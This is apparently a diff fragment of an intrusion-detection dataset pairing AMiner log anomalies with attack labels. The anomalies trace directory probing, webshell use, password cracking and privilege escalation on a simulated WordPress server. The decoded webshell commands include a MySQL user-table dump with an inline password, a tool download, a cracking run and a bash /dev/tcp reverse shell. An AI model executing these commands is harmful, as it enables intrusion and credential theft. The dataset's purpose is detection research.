+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/dist/js/admin/~adm\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:37:23 +0000] \\\"GET /wp-content/themes/go/dist/js/admin/~adm HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509443], \"DetectionTimestamp\": [1642509443], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Directory Traversal",
+      "Reconnaissance"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '~' in URL path '~admin' within a WordPress theme's admin JavaScript directory. This pattern often indicates an attempt to access user home directories, specifically probing for an 'admin' account, which could contain sensitive information or allow for privileged access.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "Wget"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/dist/js/admin/~admin\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:37:23 +0000] \\\"GET /wp-content/themes/go/dist/js/admin/~admin HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509443], \"DetectionTimestamp\": [1642509443], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Vulnerability Scanning",
+      "Exploitation for Credential Access"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access '.htaccess', a configuration file used by Apache web servers to control directory-level access and other settings. Attackers often probe for this file to identify misconfigurations or potentially gain unauthorized access.",
+    "tools": [
+      "Nikto",
+      "Burp Suite",
+      "Nessus"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:37:23.345912 2022] [authz_core:error] [pid 28492] [client 172.17.130.196:34970] AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess\"], \"Timestamps\": [1642509443.35], \"DetectionTimestamp\": [1642509443.35], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Vulnerability Scanning",
+      "Exploitation for Credential Access"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access '.htaccess_', likely a backup or renamed '.htaccess' file. Attackers often probe for variations of sensitive filenames to bypass security measures and identify misconfigurations or gain unauthorized access.",
+    "tools": [
+      "Nikto",
+      "Burp Suite",
+      "Nessus"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:37:23.348442 2022] [authz_core:error] [pid 28492] [client 172.17.130.196:34970] AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess_\"], \"Timestamps\": [1642509443.35], \"DetectionTimestamp\": [1642509443.35], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Credential Access",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access '.htpasswd', a file commonly used for HTTP Basic Authentication credentials. Attackers frequently look for this file to retrieve hashed passwords, which can then be cracked.",
+    "tools": [
+      "Wget",
+      "Curl",
+      "Burp Suite"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:37:23.358634 2022] [authz_core:error] [pid 28492] [client 172.17.130.196:34970] AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htpasswd\"], \"Timestamps\": [1642509443.36], \"DetectionTimestamp\": [1642509443.36], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Credential Access",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access '.htpasswd_', which is likely a backup or renamed '.htpasswd' file. Attackers often probe for variations of sensitive filenames to bypass security measures and retrieve credentials.",
+    "tools": [
+      "Wget",
+      "Curl",
+      "Burp Suite"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:37:23.360970 2022] [authz_core:error] [pid 28492] [client 172.17.130.196:34970] AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htpasswd_\"], \"Timestamps\": [1642509443.36], \"DetectionTimestamp\": [1642509443.36], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Vulnerability Scanning",
+      "Information Gathering"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access 'admin.php' within a WordPress theme's JavaScript directory. This is a common filename for administrative interfaces, and attackers often probe for such files to gain unauthorized access or discover sensitive functionality.",
+    "tools": [
+      "WPScan",
+      "Nikto",
+      "DirBuster"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:37:24.093110 2022] [php7:error] [pid 28490] [client 172.17.130.196:34976] script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/admin.php' not found or unable to stat\"], \"Timestamps\": [1642509444.09], \"DetectionTimestamp\": [1642509444.09], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Vulnerability Scanning",
+      "Information Gathering"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access 'index.php' within a WordPress theme's admin JavaScript directory that is reported as 'not found or unable to stat'. This is a common tactic for attackers to probe for existing files and directories, or to discover misconfigurations.",
+    "tools": [
+      "WPScan",
+      "Nikto",
+      "DirBuster"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:37:28.960093 2022] [php7:error] [pid 28408] [client 172.17.130.196:35008] script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/index.php' not found or unable to stat\"], \"Timestamps\": [1642509448.96], \"DetectionTimestamp\": [1642509448.96], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Web Shell",
+      "Command and Control",
+      "Exfiltration",
+      "Credential Access"
+    ],
+    "attack_type": "webshell",
+    "description": "High entropy in the request URL query parameter 'wp_meta' which is base64 encoded. The decoded string '[\"mysql\", \"-u\", \"wordpress\", \"-ptainox3aedeeSh\", \"wordpress_db\", \"-e\", \"\\\"select * from wp_users\\\"\"]' clearly indicates an attempt to execute a MySQL command to select all users from the WordPress database, likely for credential harvesting. The access to a PHP file in the uploads directory ('/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php') suggests a webshell has been uploaded and is being used for command execution and data exfiltration.",
+    "tools": [
+      "Web shells (e.g., PHP-backdoor, Weevely)",
+      "Metasploit (for post-exploitation modules)",
+      "Curl (for sending commands)"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D\"], \"CriticalValue\": 0.041658827497209526, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:38:25 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\\\" 200 507795 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642509505], \"DetectionTimestamp\": [1642509505], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Web Shell",
+      "Command and Control",
+      "Defense Evasion",
+      "Inhibit Response Function"
+    ],
+    "attack_type": "webshell",
+    "description": "High entropy in the request URL query parameter 'wp_meta' which is base64 encoded. The decoded string '[\"wget\", \"https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz\"]' indicates an attempt to download an external tool (wphashcrack) from GitHub. This is highly suspicious as it suggests the attacker is using a webshell (indicated by the PHP file in the uploads directory) to download and deploy additional tools for further compromise, potentially for password cracking.",
+    "tools": [
+      "Web shells (e.g., PHP-backdoor, Weevely)",
+      "Wget",
+      "Curl"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D\"], \"CriticalValue\": 0.04390676928008295, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:38:29 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\\\" 200 506717 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642509509], \"DetectionTimestamp\": [1642509509], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Web Shell",
+      "Credential Access",
+      "Defense Evasion",
+      "Inhibit Response Function"
+    ],
+    "attack_type": "cracking",
+    "description": "Extremely high entropy in the request URL query parameter 'wp_meta' which is base64 encoded. The decoded string '[\"./wphashcrack-0.1/wphashcrack.sh\", \"-w\", \"$PWD/rockyou.txt\", \"-j\", \".wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run\", \"-u\", \"phopkins\"]' indicates an attempt to execute a local script (wphashcrack.sh) for password cracking using the 'rockyou.txt' wordlist and John the Ripper. This confirms the previous observation of a webshell being used to download and execute tools for credential access.",
+    "tools": [
+      "Web shells (e.g., PHP-backdoor, Weevely)",
+      "John the Ripper",
+      "wphashcrack"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D\"], \"CriticalValue\": 0.03390702800176404, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:39:11 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1\\\" 200 506876 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642509551], \"DetectionTimestamp\": [1642509551], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Application Layer Protocol Confusion"
+    ],
+    "attack_type": "cracking",
+    "description": "Unusual occurrence frequency of HTTP POST method to '/services/ajax.php/imp/poll' on a mail server. While polling is normal, a sudden change in frequency could indicate an attacker is probing the mail server's AJAX interface for vulnerabilities or enumerating users/services. The user agent 'HeadlessChrome' also suggests automated activity, which might be suspicious.",
+    "tools": [
+      "OWASP ZAP",
+      "Burp Suite",
+      "Nmap (for service detection)"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 11, \"AnalysisComponentType\": \"EventCountClusterDetector\", \"AnalysisComponentName\": \"AMiner: Unusual occurrence frequencies of Apache Access request methods.\", \"Message\": \"Frequency anomaly detected\", \"PersistenceFileName\": \"eccd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [[\"0\"], [\"1\"], [\"6\"]], \"AffectedLogAtomFrequencies\": [161446, 93, 4], \"AffectedIdValues\": []}, \"CountData\": {\"ConfidenceFactor\": 0.5, \"Confidence\": 0.9911556457802094}, \"LogData\": {\"RawLogData\": [\"192.168.131.234 - - [18/Jan/2022:12:40:15 +0000] \\\"POST /services/ajax.php/imp/poll HTTP/1.1\\\" 200 463 \\\"https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox\\\" \\\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36\\\"\"], \"Timestamps\": [1642509615], \"DetectionTimestamp\": [1642509615], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/horde/horde-access-access.log\"]}, \"AMiner\": {\"ID\": \"192.168.128.170\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Resource Hijacking",
+      "Impact"
+    ],
+    "attack_type": "cracking",
+    "description": "Significant deviation in CPU total percentage, with the new average being considerably higher than the old average (0.409 vs 0.078). This sudden increase in CPU utilization suggests that the system is being heavily utilized for an unexpected purpose, which is indicative of resource hijacking, potentially for cryptocurrency mining or other unauthorized computation.",
+    "tools": [
+      "Cryptominers (e.g., XMRig, CPUMiner-Opt)",
+      "Malicious scripts/binaries"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 36, \"AnalysisComponentType\": \"MatchValueAverageChangeDetector\", \"AnalysisComponentName\": \"AMiner: CPU value deviates from average in monitoring logs.\", \"Message\": \"Statistical data report\", \"PersistenceFileName\": \"Default\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model\", \"/model/version\", \"/model/agent/version\", \"/model/metricset/version\", \"/model/event/version\", \"/model/time\", \"/model/service/version\", \"/model/version/0\", \"/model/version/1\", \"/model/agent/version/0\", \"/model/agent/version/1\", \"/model/agent/version/2\", \"/model/agent/version/3\", \"/model/agent/version/4\", \"/model/system/cpu/softirq/version\", \"/model/system/cpu/softirq/norm/version\", \"/model/system/cpu/iowait/version\", \"/model/system/cpu/iowait/norm/version\", \"/model/system/cpu/nice/val\", \"/model/system/cpu/nice/norm/val\", \"/model/system/cpu/val\", \"/model/system/cpu/idle/version\", \"/model/system/cpu/idle/norm/version\", \"/model/system/cpu/system/val\", \"/model/system/cpu/system/norm/val\", \"/model/system/cpu/steal/version\", \"/model/system/cpu/steal/norm/version\", \"/model/system/cpu/total/val\", \"/model/system/cpu/total/norm/val\", \"/model/system/cpu/user/version\", \"/model/system/cpu/user/norm/version\", \"/model/system/cpu/irq/version\", \"/model/system/cpu/irq/norm/version\", \"/model/metricset/version/0\", \"/model/metricset/version/1\", \"/model/event/version/0\", \"/model/event/version/1\", \"/model/event/version/2\", \"/model/ecs/version\", \"/model/host/cpu/version\", \"/model/host/version\"], \"AnomalyScores\": [{\"Path\": \"/model/system/cpu/total/norm/val\", \"AnalysisData\": {\"New\": {\"N\": 100, \"Avg\": 0.4090230000000001, \"Var\": 0.144338616132323}, \"Old\": {\"N\": 3800, \"Avg\": 0.07845189473684211, \"Var\": 0.0037339315099652274}}}], \"MinBinElements\": 100, \"MinBinTime\": 10, \"DebugMode\": false}, \"LogData\": {\"RawLogData\": [\"{\\\"@timestamp\\\":\\\"2022-01-18T12:59:54.321Z\\\",\\\"service\\\":{\\\"type\\\":\\\"system\\\"},\\\"tags\\\":[\\\"beats_input_raw_event\\\"],\\\"@version\\\":\\\"1\\\",\\\"agent\\\":{\\\"type\\\":\\\"metricbeat\\\",\\\"hostname\\\":\\\"intranet-server\\\",\\\"version\\\":\\\"7.13.2\\\",\\\"id\\\":\\\"a0c41e4e-ff4a-481f-adda-21fc96889b28\\\",\\\"name\\\":\\\"intranet-server\\\",\\\"ephemeral_id\\\":\\\"ae20c47b-0a81-4e05-a749-cbe0dacd5e36\\\"},\\\"system\\\":{\\\"cpu\\\":{\\\"softirq\\\":{\\\"pct\\\":4.0E-4,\\\"norm\\\":{\\\"pct\\\":4.0E-4}},\\\"iowait\\\":{\\\"pct\\\":0,\\\"norm\\\":{\\\"pct\\\":0}},\\\"nice\\\":{\\\"pct\\\":0.9362,\\\"norm\\\":{\\\"pct\\\":0.9362}},\\\"cores\\\":1,\\\"idle\\\":{\\\"pct\\\":0,\\\"norm\\\":{\\\"pct\\\":0}},\\\"system\\\":{\\\"pct\\\":0.0362,\\\"norm\\\":{\\\"pct\\\":0.0362}},\\\"steal\\\":{\\\"pct\\\":9.0E-4,\\\"norm\\\":{\\\"pct\\\":9.0E-4}},\\\"total\\\":{\\\"pct\\\":1,\\\"norm\\\":{\\\"pct\\\":1}},\\\"user\\\":{\\\"pct\\\":0.0262,\\\"norm\\\":{\\\"pct\\\":0.0262}},\\\"irq\\\":{\\\"pct\\\":0,\\\"norm\\\":{\\\"pct\\\":0}}}},\\\"metricset\\\":{\\\"name\\\":\\\"cpu\\\",\\\"period\\\":45000},\\\"event\\\":{\\\"duration\\\":365552,\\\"dataset\\\":\\\"system.cpu\\\",\\\"module\\\":\\\"system\\\"},\\\"ecs\\\":{\\\"version\\\":\\\"1.9.0\\\"},\\\"host\\\":{\\\"cpu\\\":{\\\"pct\\\":1},\\\"name\\\":\\\"intranet-server\\\"}}\"], \"Timestamps\": [1642510794.32], \"DetectionTimestamp\": [1642510794.32], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/logstash/intranet-server/system.cpu.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.204\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Web Shell",
+      "Command and Control",
+      "Defense Evasion"
+    ],
+    "attack_type": "reverseshell",
+    "description": "High entropy in the request URL query parameter 'wp_meta' which is base64 encoded. The decoded string '[\"bash\", \"-c\", \" '0<&196;exec 196<>/dev/tcp/192.168.130.77/51898; sh <&196 >&196 2>&196'\", \"&\"]' indicates an attempt to establish a reverse shell using Bash. This is a critical indicator of compromise, showing that the attacker has successfully uploaded a webshell (indicated by the PHP file in the uploads directory) and is attempting to gain interactive shell access to the system.",
+    "tools": [
+      "Web shells (e.g., PHP-backdoor, Weevely)",
+      "Netcat",
+      "Metasploit"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 6, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in Apache Access request.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D\"], \"CriticalValue\": 0.03829718556363683, \"ProbabilityThreshold\": 0.05}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:13:14:18 +0000] \\\"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\\\" 200 506717 \\\"-\\\" \\\"python-requests/2.27.1\\\"\"], \"Timestamps\": [1642511658], \"DetectionTimestamp\": [1642511658], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Privilege Escalation",
+      "Credential Access"
+    ],
+    "attack_type": "privilegeescalation",
+    "description": "Successful 'su' (substitute user) for user 'phopkins' by 'www-data'. The 'www-data' user typically runs the web server. A successful `su` from a web server user to a regular user (especially one named 'phopkins', potentially indicating a compromised account from previous steps) is highly suspicious and suggests that the attacker has achieved initial access through a web vulnerability (like the webshell identified earlier) and is now attempting to escalate privileges or move laterally.",
+    "tools": [
+      "Linux privilege escalation exploits",
+      "Password cracking tools (if credentials were stolen)"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/service/su\", \"/model/service/su/systemd_str\", \"/model/service/su/id\", \"/model/service/su/brack_str2\", \"/model/service/su/fm/seq\", \"/model/service/su/fm/seq/brack_str\", \"/model/service/su/fm/seq/user\", \"/model/service/su/fm/seq/by_str\", \"/model/service/su/fm/seq/su_user\"]}, \"LogData\": {\"RawLogData\": [\"Jan 18 13:14:31 intranet-server su[28816]: Successful su for phopkins by www-data\"], \"Timestamps\": [1642511671], \"DetectionTimestamp\": [1642511671], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/auth.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Privilege Escalation",
+      "Lateral Movement"
+    ],
+    "attack_type": "privilegeescalation",
+    "description": "Log entry indicating a successful 'su' session opened for user 'phopkins' by 'www-data' from '/dev/pts/1'. This confirms an interactive session was established. The fact that the 'www-data' user initiated this indicates a compromise of the web server, and the subsequent 'su' to 'phopkins' is a clear attempt at privilege escalation or lateral movement within the system after initial compromise.",
+    "tools": [
+      "Linux privilege escalation exploits",
+      "SSH",
+      "Remote access tools"
+    ],
